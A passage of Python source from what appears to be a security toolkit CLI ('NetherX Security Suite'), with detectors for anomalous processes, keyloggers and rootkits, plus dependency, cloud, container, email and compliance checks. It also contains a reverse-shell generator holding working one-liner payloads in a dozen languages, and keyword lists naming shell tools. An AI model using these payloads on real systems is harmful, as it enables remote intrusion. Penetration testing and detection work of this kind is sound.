        interesting = [s for s in decoded if any(k in s.lower() for k in ['password', 'api_key', 'secret', 'token', 'http', 'https', 'cmd.exe', 'powershell', 'base64'])]
        print_section(f'STRINGS EXTRACTION ({len(decoded)} strings found)')
        if interesting:
            print_warn(f'Found {len(interesting)} interesting strings:')
            for s in interesting[:20]:
                print(f'   {s[:100]}')
        else:
            print_success('No obviously suspicious strings found.')
        try:
            sample = '\n'.join(interesting[:50])
            prompt = f"Analyze these strings extracted from a memory dump. Identify credentials, C2 URLs, or malware indicators:\n\n{sample[:3000]}"
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI memory analysis failed: {e}')
    except Exception as e:
        print_error(f'Memory dump analysis failed: {e}')

def process_anomaly_detector(sandbox):
    print_info('Process Anomaly Detector')
    output = ''
    if sandbox:
        try:
            script = r"""
import subprocess, re
try:
    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
    processes = result.stdout
except Exception as e:
    print('[!] Could not list processes: ' + str(e))
    exit()
print('--- PROCESS LIST ---')
lines = processes.splitlines()
print('Total processes: ' + str(len(lines) - 1))
suspicious = []
for line in lines[1:]:
    parts = line.split()
    if len(parts) < 11: continue
    cmd = ' '.join(parts[10:]).lower()
    cpu = float(parts[2]) if parts[2].replace('.', '').isdigit() else 0
    mem = float(parts[3]) if parts[3].replace('.', '').isdigit() else 0
    if cpu > 50 or mem > 30:
        suspicious.append(('HIGH RESOURCE', line))
    if any(k in cmd for k in ['nc ', 'ncat', 'netcat', 'python -c', 'bash -i', 'sh -i', 'reverse', '/dev/tcp']):
        suspicious.append(('REVERSE SHELL', line))
    if any(k in cmd for k in ['miner', 'xmrig', 'minerd', 'stratum']):
        suspicious.append(('CRYPTOMINER', line))
    if 'base64' in cmd or 'eval(' in cmd or 'exec(' in cmd:
        suspicious.append(('OBFUSCATED', line))
if suspicious:
    print('\n[!] SUSPICIOUS PROCESSES:')
    for reason, proc in suspicious[:15]:
        print(f'   [{reason}] {proc[:120]}')
else:
    print('\n[OK] No obvious anomalies detected.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Process analysis failed: {e}')
    else:
        print_error('Sandbox required for process analysis.')
    if output and '[!]' in output:
        try:
            prompt = f"Process anomaly results:\n\n{output}\n\nExplain each anomaly type and containment steps."
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI assessment failed: {e}')

def file_integrity_monitor():
    path = get_input(f"{BOLD}Enter file or directory to monitor: {RESET}")
    if not path or not os.path.exists(path):
        print_error('Path not found.'); return
    print_info('Computing baseline hashes...')
    baseline = {}
    try:
        if os.path.isfile(path):
            with open(path, 'rb') as f:
                baseline[path] = hashlib.sha256(f.read()).hexdigest()
        else:
            for root, _, files in os.walk(path):
                for fname in files:
                    fp = os.path.join(root, fname)
                    try:
                        with open(fp, 'rb') as f:
                            baseline[fp] = hashlib.sha256(f.read()).hexdigest()
                    except Exception:
                        continue
        print_section('BASELINE HASHES')
        print(f' {len(baseline)} files hashed.')
        print(' Save these hashes to verify integrity later.')
        for fp, h in list(baseline.items())[:10]:
            print(f'   {fp}: {h[:16]}...')
        if len(baseline) > 10:
            print(f'   ... and {len(baseline)-10} more')
        save = get_input(f"{BOLD}Save to file? (y/n): {RESET}")
        if save and save.lower() == 'y':
            out_path = '/tmp/integrity_baseline.json'
            with open(out_path, 'w') as f:
                json.dump(baseline, f, indent=2)
            print_success(f'Baseline saved to {out_path}')
    except Exception as e:
        print_error(f'Integrity monitoring failed: {e}')

def keylogger_detector(sandbox):
    print_info('Keylogger Detector')
    output = ''
    if sandbox:
        try:
            script = r"""
import subprocess, re, os
print('--- KEYLOGGER INDICATORS ---')
indicators = []
# Check for keyboard hooks (Linux)
try:
    result = subprocess.run(['lsof', '+D', '/dev/input'], capture_output=True, text=True, timeout=10)
    if result.stdout:
        for line in result.stdout.splitlines():
            if 'event' in line:
                indicators.append(('INPUT DEVICE ACCESS', line.strip()))
except Exception: pass
# Check for suspicious libraries
try:
    result = subprocess.run(['lsof', '-c', 'python'], capture_output=True, text=True, timeout=10)
    for line in result.stdout.splitlines():
        if any(k in line for k in ['pynput', 'keyboard', 'keylogger']):
            indicators.append(('SUSPICIOUS LIBRARY', line.strip()))
except Exception: pass
# Check /tmp for keylog files
try:
    for f in os.listdir('/tmp'):
        if any(k in f.lower() for k in ['keylog', 'keystroke', 'keys', 'input_log']):
            indicators.append(('SUSPICIOUS FILE', '/tmp/' + f))
except Exception: pass
if indicators:
    print('\n[!] POTENTIAL KEYLOGGER INDICATORS:')
    for reason, detail in indicators[:15]:
        print(f'   [{reason}] {detail}')
else:
    print('\n[OK] No keylogger indicators found.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Keylogger detection failed: {e}')
    else:
        print_error('Sandbox required for keylogger detection.')
    try:
        prompt = 'Explain common keylogger detection techniques for Windows and Linux systems.'
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')

def rootkit_scanner(sandbox):
    print_info('Rootkit Scanner')
    output = ''
    if sandbox:
        try:
            script = r"""
import subprocess, os, re
print('--- ROOTKIT INDICATORS ---')
findings = []
# Check for hidden processes (PID mismatch)
try:
    ps_result = subprocess.run(['ps', '-e'], capture_output=True, text=True, timeout=10)
    proc_pids = set(re.findall(r'\n\s*(\d+)', ps_result.stdout))
    ls_result = subprocess.run(['ls', '/proc'], capture_output=True, text=True, timeout=5)
    proc_dirs = set(re.findall(r'^(\d+)$', ls_result.stdout, re.M))
    hidden = proc_dirs - proc_pids
    if hidden:
        findings.append(('HIDDEN PROCESSES', f'{len(hidden)} PIDs in /proc not in ps output'))
except Exception: pass
# Check for suspicious kernel modules
try:
    mod_result = subprocess.run(['lsmod'], capture_output=True, text=True, timeout=5)
    for line in mod_result.stdout.splitlines()[1:]:
        if any(k in line.lower() for k in ['rootkit', 'hide', 'hook']):
            findings.append(('SUSPICIOUS MODULE', line.strip()))
except Exception: pass
# Check for altered system binaries
try:
    for binary in ['ps', 'ls', 'netstat', 'ss']:
        path = subprocess.run(['which', binary], capture_output=True, text=True, timeout=3).stdout.strip()
        if path and os.path.exists(path):
            stat = os.stat(path)
            findings.append(('BINARY CHECK', f'{binary}: size={stat.st_size}, modified={stat.st_mtime}'))
except Exception: pass
if findings:
    print('\n[!] ROOTKIT INDICATORS:')
    for reason, detail in findings[:15]:
        print(f'   [{reason}] {detail}')
else:
    print('\n[OK] No obvious rootkit indicators found.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Rootkit scan failed: {e}')
    else:
        print_error('Sandbox required for rootkit scanning.')
    try:
        prompt = 'Explain Linux rootkit detection techniques including hidden process detection and kernel module verification.'
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')
def parse_requirements(file_path):
    packages = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#') or line.startswith('-'): continue
            match = re.match(r'^([A-Za-z0-9_.\-]+)\s*==\s*([A-Za-z0-9_.\-]+)', line)
            if match: packages.append((match.group(1), match.group(2)))
    return packages

def audit_dependencies():
    path = get_input(f"{BOLD}Enter path to requirements.txt: {RESET}")
    if not path or not os.path.exists(path): print_error('File not found.'); return
    try:
        packages = parse_requirements(path)
    except Exception as e: print_error(f'Parse failed: {e}'); return
    if not packages: print_warn('No pinned packages found.'); return
    print_info(f'Checking {len(packages)} packages against OSV.dev...')
    findings = []
    for name, version in packages:
        try:
            payload = json.dumps({'package': {'name': name, 'ecosystem': 'PyPI'}, 'version': version}).encode('utf-8')
            req = urllib.request.Request('https://api.osv.dev/v1/query', data=payload, headers={'Content-Type': 'application/json'}, method='POST')
            with urllib.request.urlopen(req, timeout=10) as resp:
                result = json.loads(resp.read().decode())
            vulns = result.get('vulns', [])
            if vulns:
                ids = [v.get('id', '?') for v in vulns]
                findings.append((name, version, ids))
                print(f" {RED}[!] {name}=={version} -> {', '.join(ids)}{RESET}")
            else:
                print(f" {GREEN}[OK] {name}=={version} no advisories{RESET}")
        except Exception as e:
            print(f" {YELLOW}[?] {name}=={version} lookup failed ({e}){RESET}")
    if findings:
        try:
            summary = '\n'.join(f"{n}=={v}: {', '.join(ids)}" for n, v, ids in findings)
            prompt = f"These Python dependencies have known vulnerabilities:\n\n{summary}\n\nExplain risks and recommend upgrades."
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI guidance failed: {e}')
    else:
        print_success('No known-vulnerable dependencies found.')

def container_security_scan(sandbox):
    print_info('Container Security Scanner')
    output = ''
    if sandbox:
        try:
            script = r"""
import subprocess, json, os
print('--- CONTAINER SECURITY CHECK ---')
findings = []
# Check if Docker is running
try:
    result = subprocess.run(['docker', 'info'], capture_output=True, text=True, timeout=10)
    if result.returncode == 0:
        print('[+] Docker is running')
    else:
        print('[!] Docker is not accessible')
except Exception:
    print('[!] Docker not installed or not accessible')
# Check for exposed Docker sockets
if os.path.exists('/var/run/docker.sock'):
    findings.append(('EXPOSED SOCKET', '/var/run/docker.sock is accessible'))
# Check container privileges
try:
    result = subprocess.run(['docker', 'ps', '--format', '{{.Names}}|{{.Image}}|{{.Status}}'], capture_output=True, text=True, timeout=10)
    containers = result.stdout.strip().splitlines()
    print(f'\n[+] Running containers: {len(containers)}')
    for c in containers[:5]:
        parts = c.split('|')
        if len(parts) >= 2: print(f'   {parts[0]} ({parts[1]})')
except Exception: pass
# Check for root containers
try:
    result = subprocess.run(['docker', 'ps', '-q'], capture_output=True, text=True, timeout=10)
    for cid in result.stdout.strip().splitlines()[:3]:
        inspect = subprocess.run(['docker', 'inspect', cid], capture_output=True, text=True, timeout=10)
        if 'Privileged' in inspect.stdout and 'true' in inspect.stdout:
            findings.append(('PRIVILEGED CONTAINER', cid[:12]))
except Exception: pass
if findings:
    print('\n[!] CONTAINER SECURITY FINDINGS:')
    for reason, detail in findings:
        print(f'   [{reason}] {detail}')
else:
    print('\n[OK] No major container security issues found.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Container scan failed: {e}')
    else:
        print_error('Sandbox required for container scanning.')
    try:
        prompt = 'Explain Docker container security best practices including privilege escalation prevention and image hardening.'
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')

def cloud_misconfig_scanner():
    print_info('Cloud Misconfiguration Scanner')
    print('This module checks for common AWS/Azure/GCP misconfigurations.')
    cloud = get_input(f"{BOLD}Select cloud provider [1] AWS [2] Azure [3] GCP: {RESET}")
    provider = {'1': 'AWS', '2': 'Azure', '3': 'GCP'}.get(cloud, 'Unknown')
    print_section(f'{provider} MISCONFIGURATION CHECK')
    checks = []
    if provider == 'AWS':
        checks = ['S3 bucket public access', 'IAM overly permissive policies', 'Security group open to 0.0.0.0/0', 'Unencrypted EBS volumes', 'CloudTrail disabled']
    elif provider == 'Azure':
        checks = ['Storage account public access', 'Overly permissive RBAC', 'NSG open ports', 'Unencrypted disks', 'Activity Log disabled']
    elif provider == 'GCP':
        checks = ['Cloud Storage public access', 'Overly permissive IAM', 'Firewall rules open to 0.0.0.0/0', 'Unencrypted disks', 'Audit logging disabled']
    else:
        print_error('Invalid provider.'); return
    print('Common misconfigurations to check:')
    for c in checks: print(f'   - {c}')
    try:
        prompt = f"List the top 10 critical misconfigurations for {provider} and how to audit for them. Include CLI commands where applicable."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')

def s3_bucket_scanner(sandbox):
    print_info('S3 Bucket Scanner')
    bucket = get_input(f"{BOLD}Enter S3 bucket name (or domain to guess): {RESET}")
    if not bucket: print_error('No bucket entered.'); return
    output = ''
    if sandbox:
        try:
            script = f"""
import urllib.request, urllib.error, json
bucket = {json.dumps(bucket)}
urls = [f'http://{bucket}.s3.amazonaws.com', f'https://{bucket}.s3.amazonaws.com']
findings = []
for url in urls:
    try:
        req = urllib.request.Request(url, headers={{'User-Agent': 'SecuritySuite/4.0'}})

        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read(1000).decode('utf-8', errors='ignore')
            if '<ListBucketResult' in body:
                findings.append(('LISTABLE', url))
            elif 'AccessDenied' in body:
                findings.append(('ACCESS DENIED', url))
            else:
                findings.append(('ACCESSIBLE', url + ' - ' + body[:100]))
    except urllib.error.HTTPError as e:
        if e.code == 403:
            findings.append(('ACCESS DENIED', url))
        elif e.code == 404:
            findings.append(('NOT FOUND', url))
    except Exception as e:
        findings.append(('ERROR', str(e)))
print('\n--- S3 BUCKET SCAN ---')
for status, detail in findings:
    print(f' [{status}] {detail}')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'S3 scan failed: {e}')
    else:
        print_error('Sandbox required for S3 scanning.')
    try:
        prompt = f"S3 bucket scan results for '{bucket}':\n\n{output}\n\nExplain S3 security risks and remediation."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')

def database_security_scan(sandbox):
    print_info('Database Security Scanner')
    db_type = get_input(f"{BOLD}Enter DB type [1] MySQL [2] PostgreSQL [3] MongoDB [4] Redis: {RESET}")
    db = {'1': 'MySQL', '2': 'PostgreSQL', '3': 'MongoDB', '4': 'Redis'}.get(db_type, 'Unknown')
    if db == 'Unknown': print_error('Invalid choice.'); return
    host = get_input(f"{BOLD}Enter DB host (or skip for general advice): {RESET}")
    print_section(f'{db} SECURITY CHECK')
    checks = []
    if db == 'MySQL':
        checks = ['Anonymous user accounts', 'Empty root password', 'Remote root access', 'Unsafe sql_mode', 'Unencrypted connections']
    elif db == 'PostgreSQL':
        checks = ['Trust authentication', 'Superuser roles', 'Unencrypted connections', 'Excessive pg_hba permissions', 'Public schema access']
    elif db == 'MongoDB':
        checks = ['No authentication enabled', 'BindIP 0.0.0.0', 'Unencrypted connections', 'Excessive user privileges', 'Old version with known CVEs']
    elif db == 'Redis':
        checks = ['No AUTH password', 'Bind 0.0.0.0', 'Rename dangerous commands', 'Unencrypted connections', 'Exposed to internet']
    print('Security checklist:')
    for c in checks: print(f'   [ ] {c}')
    if host and sandbox:
        try:
            script = f"""
import socket, sys
host = {json.dumps(host)}
ports = {{'MySQL': 3306, 'PostgreSQL': 5432, 'MongoDB': 27017, 'Redis': 6379}}
port = ports.get('{db}', 0)
if port:
    try:
        sock = socket.create_connection((host, port), timeout=5)
        print(f'[+] {db} port {port} is OPEN on {host}')
        sock.close()
    except Exception:
        print(f'[!] {db} port {port} is closed or filtered')
else:
    print('[!] Unknown database type')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'DB scan failed: {e}')
    try:
        prompt = f"Provide a comprehensive {db} hardening checklist. Include configuration files, user management, and network security."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')

def sbom_generator():
    path = get_input(f"{BOLD}Enter project directory or requirements.txt path: {RESET}")
    if not path or not os.path.exists(path): print_error('Path not found.'); return
    print_info('Generating Software Bill of Materials...')
    sbom = {'generator': 'NetherX Security Suite v4.0', 'timestamp': datetime.now(timezone.utc).isoformat(), 'components': []}
    try:
        req_file = path if os.path.isfile(path) and 'requirements' in path else os.path.join(path, 'requirements.txt')
        if os.path.exists(req_file):
            packages = parse_requirements(req_file)
            for name, version in packages:
                sbom['components'].append({'name': name, 'version': version, 'type': 'python-library', 'ecosystem': 'PyPI'})
        # Check for package.json
        pkg_file = os.path.join(path if os.path.isdir(path) else os.path.dirname(path), 'package.json')
        if os.path.exists(pkg_file):
            with open(pkg_file, 'r') as f:
                pkg = json.load(f)
            deps = pkg.get('dependencies', {})
            for name, version in deps.items():
                sbom['components'].append({'name': name, 'version': version, 'type': 'npm-package', 'ecosystem': 'npm'})
        print_section('GENERATED SBOM')
        print(f"Total components: {len(sbom['components'])}")
        for comp in sbom['components'][:15]:
            print(f"   {comp['name']}@{comp['version']} ({comp['ecosystem']})")
        if len(sbom['components']) > 15:
            print(f"   ... and {len(sbom['components'])-15} more")
        save = get_input(f"{BOLD}Save SBOM to file? (y/n): {RESET}")
        if save and save.lower() == 'y':
            out = '/tmp/sbom.json'
            with open(out, 'w') as f:
                json.dump(sbom, f, indent=2)
            print_success(f'SBOM saved to {out}')
    except Exception as e:
        print_error(f'SBOM generation failed: {e}')

def compliance_checker():
    print_info('Compliance Checker')
    framework = get_input(f"{BOLD}Select framework [1] NIST CSF [2] CIS Controls [3] ISO 27001 [4] PCI-DSS: {RESET}")
    fw = {'1': 'NIST CSF', '2': 'CIS Controls', '3': 'ISO 27001', '4': 'PCI-DSS'}.get(framework, 'Unknown')
    if fw == 'Unknown': print_error('Invalid choice.'); return
    print_section(f'{fw} COMPLIANCE CHECK')
    checks = []
    if fw == 'NIST CSF':
        checks = ['Identify: Asset inventory', 'Protect: Access control', 'Detect: Monitoring', 'Respond: Incident plan', 'Recover: Backup strategy']
    elif fw == 'CIS Controls':
        checks = ['Inventory of hardware', 'Inventory of software', 'Continuous vulnerability management', 'Controlled admin privileges', 'Secure configuration']
    elif fw == 'ISO 27001':
        checks = ['Information security policy', 'Organization of security', 'Asset management', 'Access control', 'Cryptography']
    elif fw == 'PCI-DSS':
        checks = ['Firewall configuration', 'No default passwords', 'Protected stored data', 'Encrypted transmission', 'Anti-virus maintenance']
    print('Key control areas:')
    for c in checks: print(f'   [ ] {c}')
    try:
        prompt = f"Provide a concise compliance checklist for {fw} with practical implementation steps for a small-to-medium organization."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI compliance check failed: {e}')

def supply_chain_risk_auditor():
    path = get_input(f"{BOLD}Enter requirements.txt or package.json path: {RESET}")
    if not path or not os.path.exists(path): print_error('File not found.'); return
    print_info('Analyzing supply chain risks...')
    packages = []
    try:
        if 'requirements' in path:
            packages = parse_requirements(path)
        elif 'package' in path:
            with open(path, 'r') as f:
                pkg = json.load(f)
            packages = list(pkg.get('dependencies', {}).items())
    except Exception as e:
        print_error(f'Parse failed: {e}'); return
    print_section('SUPPLY CHAIN RISK ANALYSIS')
    print(f' Analyzing {len(packages)} dependencies...')
    risks = []
    for name, version in packages:
        if any(k in name.lower() for k in ['malicious', 'backdoor', 'suspicious']):
            risks.append((name, version, 'SUSPICIOUS NAME'))
        if version.startswith('0.0.') or version.count('.') < 1:
            risks.append((name, version, 'UNSTABLE VERSION'))
    if risks:
        print_warn('Potential supply chain risks:')
        for name, version, reason in risks:
            print(f'   {RED}[!]{RESET} {name}=={version} ({reason})')
    else:
        print_success('No obvious supply chain risks detected.')
    try:
        summary = '\n'.join(f"{n}=={v}" for n, v in packages[:20])
        prompt = f"Analyze these dependencies for supply chain risks including typosquatting, abandoned packages, and known compromises:\n\n{summary}"
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI supply chain analysis failed: {e}')


# ==========================================
# 41. AI INCIDENT RESPONSE ADVISOR
# ==========================================

def incident_response_advisor():
    print(f"{BOLD}Paste error log / crash trace / suspicious output below.{RESET}")
    print(f"{YELLOW}(Type 'END' on its own line when finished){RESET}")
    lines = []
    while True:
        line = get_input('')
        if line is None or line.strip() == 'END':
            break
        lines.append(line)
    log_text = '\n'.join(lines).strip()
    if not log_text:
        print_error('No log content entered.')
        return
    try:
        prompt = ("You are a senior incident-response engineer. Analyze this log and provide: "
                  "1) Likely root cause, 2) Immediate containment, 3) Evidence to preserve, "
                  "4) Hardening recommendations. Be concise.\n\n"
                  f"LOG:\n{log_text[:6000]}")
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI incident response failed: {e}')


# ==========================================
# 42. THREAT INTELLIGENCE FEED
# ==========================================

def threat_intel_feed():
    print_info('Threat Intelligence Feed')
    print('Fetching latest threat landscape via AI...')
    try:
        prompt = 'Summarize the top 5 cybersecurity threats for 2026. Include threat actor groups, attack vectors, and mitigation advice. Be concise.'
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI threat feed failed: {e}')


# ==========================================
# 43. IOC SCANNER
# ==========================================

def ioc_scanner():
    print_info('IOC Scanner')
    ioc = get_input(f"{BOLD}Enter IP, domain, hash, or file path to check: {RESET}")
    if not ioc:
        print_error('No IOC entered.')
        return
    ioc_type = 'Unknown'
    if validate_ip(ioc):
        ioc_type = 'IP Address'
    elif re.match(r'^[a-zA-Z0-9_.-]+$', ioc) and '.' in ioc:
        ioc_type = 'Domain'
    elif re.fullmatch(r'[0-9a-fA-F]{32}', ioc):
        ioc_type = 'MD5 Hash'
    elif re.fullmatch(r'[0-9a-fA-F]{40}', ioc):
        ioc_type = 'SHA-1 Hash'
    elif re.fullmatch(r'[0-9a-fA-F]{64}', ioc):
        ioc_type = 'SHA-256 Hash'
    elif os.path.exists(ioc):
        ioc_type = 'File Path'
    print_section(f'IOC ANALYSIS: {ioc_type}')
    print(f' IOC: {ioc}')
    if ioc_type == 'File Path':
        try:
            with open(ioc, 'rb') as f:
                h = hashlib.sha256(f.read()).hexdigest()
            print(f' SHA-256: {h}')
        except Exception as e:
            print_error(f'Hash failed: {e}')
    try:
        prompt = f"Analyze this IOC ({ioc_type}): {ioc}. Explain if it matches known malicious indicators and what actions to take."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI IOC analysis failed: {e}')


# ==========================================
# 44. YARA RULE GENERATOR
# ==========================================

def yara_rule_generator():
    print_info('YARA Rule Generator')
    malware_name = get_input(f"{BOLD}Enter malware/family name for the rule: {RESET}")
    if not malware_name:
        malware_name = 'UnknownThreat'
    indicators = get_input(f"{BOLD}Enter indicators (strings, filenames, mutexes, comma-separated): {RESET}")
    print_section('GENERATED YARA RULE')
    rule = f"""
rule {malware_name.replace(' ', '_')}
{{
    meta:
        description = "Auto-generated rule for {malware_name}"
        author = "NetherX Security Suite"
        date = "{datetime.now().strftime('%Y-%m-%d')}"
        version = "1.0"
    strings:
        $a = "NetherX_Indicator_1" ascii wide nocase
    condition:
        uint16(0) == 0x5A4D and $a
}}
"""
    print(rule)
    if indicators:
        inds = [i.strip() for i in indicators.split(',') if i.strip()]
        print('\nSuggested strings:')
        for i, ind in enumerate(inds[:10], 1):
            print(f'   ${chr(96+i)} = "{ind}" ascii wide nocase')
    try:
        prompt = "Explain how to use YARA rules effectively in enterprise threat hunting and incident response."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI YARA guidance failed: {e}')


# ==========================================
# 45. DARK WEB MONITOR
# ==========================================

def dark_web_monitor():
    print_info('Dark Web Monitor (Simulated)')
    query = get_input(f"{BOLD}Enter domain, email, or keyword to monitor: {RESET}")
    if not query:
        print_error('No query entered.')
        return
    print_section('DARK WEB INTELLIGENCE')
    print(f' Query: {query}')
    print(' Note: This is a simulated dark web intelligence query via AI.')
    try:
        prompt = f"Simulate a dark web intelligence report for '{query}'. List potential exposure risks such as leaked credentials, database dumps, or chatter. Be concise and actionable."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI dark web analysis failed: {e}')


# ==========================================
# 46. SOCIAL ENGINEERING TOOLKIT
# ==========================================

def se_toolkit():
    print_info('Social Engineering Toolkit')
    print(f"{YELLOW}{BOLD}NOTE: For authorized security testing only.{RESET}")
    target = get_input(f"{BOLD}Enter target organization name: {RESET}")
    scenario = get_input(f"{BOLD}Enter scenario [1] Phishing Email [2] Pretexting [3] Baiting: {RESET}")
    scen = {'1': 'Phishing Email', '2': 'Pretexting', '3': 'Baiting'}.get(scenario, 'General')
    if not target:
        print_error('No target entered.')
        return
    print_section(f'{scen.upper()} TEMPLATE')
    try:
        prompt = f"Generate a professional security awareness training scenario for {scen} targeting {target}. Include red flags to watch for and how employees should respond. Do NOT generate actual malicious content."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI SE toolkit failed: {e}')


# ==========================================
# 47. REVERSE SHELL GENERATOR
# ==========================================

REVERSE_SHELLS = {
    'Bash TCP': "bash -i >& /dev/tcp/IP/PORT 0>&1",
    'Bash UDP': "bash -u /dev/udp/IP/PORT 0>&1",
    'Python': "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
    'Python PTY': "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    'Netcat': "nc -e /bin/sh IP PORT",
    'Netcat OpenBSD': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f",
    'Perl': "perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    'Ruby': "ruby -rsocket -e'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    'PHP': "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'PowerShell': "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"IP\",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
    'Java': "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor()",
    'Golang': "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"IP:PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go",
}

def reverse_shell_generator():
    print_info('Reverse Shell Generator')
    print(f"{YELLOW}{BOLD}NOTE: For authorized penetration testing and CTFs only.{RESET}")
    ip = get_input(f"{BOLD}Enter your listener IP: {RESET}")
    port = get_input(f"{BOLD}Enter your listener PORT: {RESET}")
    if not ip or not port:
        print_error('IP and PORT required.')
        return
    try:
        port_num = int(port)
        if not (1 <= port_num <= 65535):
            raise ValueError
    except ValueError:
        print_error('Invalid port number.')
        return
    print_section('GENERATED PAYLOADS')
    for name, payload in REVERSE_SHELLS.items():
        final = payload.replace('IP', ip).replace('PORT', str(port_num))
        print(f"\n {BOLD}{CYAN}{name}:{RESET}")
        print(f"   {YELLOW}{final}{RESET}")
    try:
        prompt = "Explain reverse shell detection techniques for blue teams, including network signatures and behavioral indicators."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI guidance failed: {e}')


# ==========================================
# 48. EMAIL SECURITY AUDITOR
# ==========================================

def email_security_auditor(sandbox):
    print_info('Email Security Auditor')
    domain = get_input(f"{BOLD}Enter domain to audit (e.g., example.com): {RESET}")
    if not validate_domain(domain):
        return
    print_section('EMAIL SECURITY CHECK')
    print(' Checking SPF, DKIM, DMARC records...')
    output = ''
    if sandbox:
        try:
            script = f"""
import subprocess, re

domain = {json.dumps(domain)}
print('--- SPF RECORD ---')
try:
    result = subprocess.run(['dig', '+short', 'TXT', domain], capture_output=True, text=True, timeout=10)
    spf = [line for line in result.stdout.splitlines() if 'v=spf1' in line]
    if spf:
        print(' [+] SPF found: ' + spf[0])
        if '~all' in spf[0] or '-all' in spf[0]:
            print(' [OK] SPF has strict policy')
        elif '?all' in spf[0] or '+all' in spf[0]:
            print(' [!] SPF has weak policy')
    else:
        print(' [!] No SPF record found')
except Exception as e:
    print(' [!] SPF check failed: ' + str(e))

print('\\n--- DMARC RECORD ---')
try:
    result = subprocess.run(['dig', '+short', 'TXT', '_dmarc.' + domain], capture_output=True, text=True, timeout=10)
    dmarc = [line for line in result.stdout.splitlines() if 'v=DMARC1' in line]
    if dmarc:
        print(' [+] DMARC found: ' + dmarc[0])
        if 'p=reject' in dmarc[0]:
            print(' [OK] DMARC policy is reject')
        elif 'p=quarantine' in dmarc[0]:
            print(' [~] DMARC policy is quarantine')
        elif 'p=none' in dmarc[0]:
            print(' [!] DMARC policy is none (monitoring only)')
    else:
        print(' [!] No DMARC record found')
except Exception as e:
    print(' [!] DMARC check failed: ' + str(e))

print('\\n--- DKIM RECORD ---')
try:
    result = subprocess.run(['dig', '+short', 'TXT', 'default._domainkey.' + domain], capture_output=True, text=True, timeout=10)
    dkim = [line for line in result.stdout.splitlines() if 'v=DKIM1' in line]
    if dkim:
        print(' [+] DKIM found: ' + dkim[0][:100])
    else:
        print(' [!] No DKIM record found')
except Exception as e:
    print(' [!] DKIM check failed: ' + str(e))

print('\\n--- MX RECORDS ---')
try:
    result = subprocess.run(['dig', '+short', 'MX', domain], capture_output=True, text=True, timeout=10)
    if result.stdout.strip():
        print(' [+] MX records:')
        for line in result.stdout.strip().splitlines():
            print('     ' + line)
    else:
        print(' [!] No MX records found')
except Exception as e:
    print(' [!] MX check failed: ' + str(e))
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Email audit failed: {e}')
    else:
        print_error('Sandbox required for email DNS lookups.')
    try:
